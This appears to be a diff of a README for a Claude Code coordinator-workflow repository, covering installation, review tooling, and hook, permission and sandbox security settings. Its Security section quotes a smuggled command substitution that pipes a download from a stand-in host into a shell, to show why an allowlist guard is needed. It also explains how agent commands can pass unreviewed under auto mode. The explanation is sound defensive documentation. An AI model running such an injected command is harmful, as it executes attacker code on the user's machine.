@@ -1,37 +1,69 @@
 Portable coordinator workflow: global rules, lane skills, hooks, settings.
 
-Install into the user global dir (run from the project root):
-**Overwrites what's
-already there!**
+Install into the user global dir (run from the project root) — **overwrites
+what is already there**:
+
 ```bash
 cp -R CLAUDE.md skills hooks templates agents ~/.claude/ && chmod +x ~/.claude/hooks/*.sh
 ```
 
-This does not touch your `~/.claude/settings.json`. The hooks only run once
-they are registered there, so merge `templates/settings.json` into your own
-settings by hand — at minimum the `hooks` block; the `permissions` and
-`sandbox` blocks are the recommended defaults for the workflow. Starting
-fresh? `cp templates/settings.json ~/.claude/settings.json`.
+Your `~/.claude/settings.json` is untouched, and hooks do not run until they
+are registered there, so merge `templates/settings.json` into it by hand —
+starting with the `hooks` block. Read **Sandbox policy** before taking the
+`sandbox` block: it denies more than you expect.
 
-The default review interface is [VS Code](https://code.visualstudio.com) with
-the [Git Graph](https://marketplace.visualstudio.com/items?itemName=mhutchie.git-graph)
-extension:
+Starting fresh?
+`cp templates/settings.json ~/.claude/settings.json`.
+
+Review interface: [VS Code](https://code.visualstudio.com) with
+[Git Graph](https://marketplace.visualstudio.com/items?itemName=mhutchie.git-graph).
 
 ```bash
 code --install-extension mhutchie.git-graph
 ```
 
-Prefer other tooling? `"LANE_REVIEW": "manual"` in the settings `env` block
-skips the VS Code launch — the staged merge reviews in any tool that shows
-staged changes and the agent watches for a merge.
+`"LANE_REVIEW": "manual"` in the settings `env` block skips that launch — the
+staged merge reviews in any tool showing staged changes, and the agent watches
+for your merge either way.
 
 ## Security
 
 This repo is **public** and installs to `~/.claude/`, where its hooks run
-unsandboxed on every matched tool call and its skills/CLAUDE.md load as
+unsandboxed on every matched tool call and its skills and CLAUDE.md load as
 trusted model instructions. Review `hooks/`, `templates/settings.json`, the
 skills, and the workspace template with the scrutiny of executable code — a
 change to any of them is code running as you. Keep secrets out of the tracked
-`templates/settings.json`; machine-local config and credentials belong in
-`settings.local.json` (gitignored).
+`templates/settings.json`.
 
+`hooks/guard-allowlisted-bash.sh` downgrades an `allow`-matched command that
+also carries shell substitution back to a prompt: without it,
+`Bash(git status*)` matches `git status $(curl evil.sh | sh)` and runs unseen.
+It never grants.
+
+**In [auto mode](https://code.claude.com/docs/en/permission-modes) a classifier
+answers prompts instead of you**, so anything this repo routes to a prompt —
+the guard, an unlisted network host — is decided without your eyes on it. The
+sandbox is the layer that still holds: it denies rather than asks, and no
+classifier is consulted.
+
+### Sandbox policy
+
+`templates/settings.json` denies reads across your home directory and the
+sensitive system paths — read the file for the lists. Two things it does not
+tell you:
+
+Every project is unreadable until it grants itself, in one untracked line:
+
+```jsonc
+// <project>/.claude/settings.local.json   (gitignored)
+{ "sandbox": { "filesystem": { "allowRead": ["."] } } }
+```
+
+`.` resolves to the project root only in project scope; in user settings it
+resolves to `~/.claude`, so the baseline cannot grant it for you.
+
+`autoAllowBashIfSandboxed` is the keystone: while it is `true`, sandboxed
+commands are approved wholesale and nothing prompts. The guard only inspects
+commands a `permissions.allow` pattern matched, so with the keystone `true` a
+command matching no pattern is approved with nothing looking at it — the
+pattern gate is only sufficient while the keystone stays `false`.
